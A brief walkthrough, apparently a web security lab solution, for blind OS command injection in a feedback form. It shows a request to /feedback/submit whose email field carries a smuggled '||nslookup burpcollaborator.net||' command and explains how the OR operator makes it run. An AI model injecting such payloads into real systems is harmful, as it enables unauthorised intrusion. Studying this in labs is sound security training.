1. Capture the request POST /feedback/submit
2. Prepend the string "||nslookup burpcollaborator.net||" before the value of email parameter in the body of the request. The body of request now looks like this:
```
name=test&email=||nslookup burpcollaborator.net||test%40gmail.com&subject=test&message=test
```
3. || is the logical OR operator. The ```nslookup burpcollaborator.net``` command will execute if its previous command fail, which is the case since the value of email is invalid.